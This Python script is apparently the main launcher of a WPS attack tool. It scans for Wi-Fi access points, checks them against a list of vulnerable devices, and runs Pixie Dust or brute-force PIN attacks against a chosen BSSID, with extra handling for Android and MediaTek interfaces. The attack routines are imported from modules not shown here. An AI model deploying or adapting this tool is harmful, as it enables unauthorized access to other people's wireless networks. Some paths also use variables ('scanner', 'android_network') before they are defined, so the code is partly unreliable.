#!/usr/bin/env python3
import os
import sys
import signal
import time
from pathlib import Path

import src.wifi.android
import src.wifi.scanner
import src.wps.connection
import src.wps.bruteforce
import src.utils
import src.args

def signal_handler(signum, frame):
    """Handle interruption gracefully."""
    print('\n[!] Received interrupt signal')
    print('[*] Cleaning up...')
    if 'connection' in globals():
        connection._cleanup()
    sys.exit(1)

if __name__ == '__main__':
    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)

    # Python 3.8 is required
    if sys.hexversion < 0x030800F0:
        src.utils.die('The program requires Python 3.8 and above')

    # Running as root is required to use the interface
    if os.getuid() != 0:
        src.utils.die('Run it as root')

    # Initialize directories
    pixiewps_dir = src.utils.PIXIEWPS_DIR
    sessions_dir = src.utils.SESSIONS_DIR
    
    for directory in [sessions_dir, pixiewps_dir]:
        if not os.path.exists(directory):
            os.makedirs(directory)

    # Parse arguments
    args = src.args.parseArgs()

    # Handle MediaTek WiFi interface
    if args.mtk_wifi:
        wmtWifi_device = Path('/dev/wmtWifi')
        if not wmtWifi_device.is_char_device():
            src.utils.die('Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): '
                '/dev/wmtWifi does not exist or it is not a character device')
        wmtWifi_device.chmod(0o644)
        wmtWifi_device.write_text('1', encoding='utf-8')

    # Initialize interface
    if not src.utils.ifaceCtl(args.interface, action='up'):
        src.utils.die(f'Unable to up interface \'{args.interface}\'')

    try:
        while True:
            try:
                # Initialize Android network handling
                android_network = src.wifi.android.AndroidNetwork()

                if args.clear:
                    src.utils.clearScreen()

                if src.utils.isAndroid() is True:
                    android_network.storeAlwaysScanState()
                    android_network.disableWifi()

                # Initialize connection handler
                if args.bruteforce:
                    connection = src.wps.bruteforce.Initialize(args.interface)
                else:
                    connection = src.wps.connection.Initialize(
                        args.interface, args.write, args.save, args.verbose
                    )

                # Handle PBC mode
                if args.pbc:
                    connection.singleConnection(pbc_mode=True)
                else:
                    # Handle BSSID selection
                    if not args.bssid:
                        try:
                            with open(args.vuln_list, 'r', encoding='utf-8') as file:
                                vuln_list = file.read().splitlines()
                        except FileNotFoundError:
                            vuln_list = []

                        if not args.loop:
                            print('[*] BSSID not specified (--bssid) — scanning for available networks')

                        # Enhanced network scanning
                        scanner = src.wifi.scanner.WiFiScanner(args.interface, vuln_list)
                        args.bssid = scanner.promptNetwork()

                    # Perform connection attempt
                    if args.bssid:
                        if args.bruteforce:
                            connection.smartBruteforce(
                                args.bssid, args.pin, args.delay
                            )
                        else:
                            # Add extra information for result storage
                            extra_info = {
                                'vendor': scanner.wps_generator._detectVendor(args.bssid),
                                'signal_strength': scanner._getCurrentSignalStrength(args.bssid),
                                'wps_version': scanner._getWPSVersion(args.bssid)
                            }
                            
                            success = connection.singleConnection(
                                args.bssid, args.pin, args.pixie_dust,
                                args.show_pixie_cmd, args.pixie_force,
                                extra_info=extra_info
                            )
                            
                            # Add delay between attempts in loop mode
                            if args.loop and not success:
                                print('[*] Waiting 5 seconds before next attempt...')
                                time.sleep(5)

                if not args.loop:
                    break

                args.bssid = None

            except KeyboardInterrupt:
                if args.loop:
                    if input('\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ').lower() == 'y':
                        print('Aborting…')
                        break
                    args.bssid = None
                else:
                    print('\nAborting…')
                    break

    finally:
        # Cleanup
        if src.utils.isAndroid() is True:
            android_network.enableWifi()

        if args.iface_down:
            src.utils.ifaceCtl(args.interface, action='down')

        if args.mtk_wifi:
            wmtWifi_device.write_text('0', encoding='utf-8')
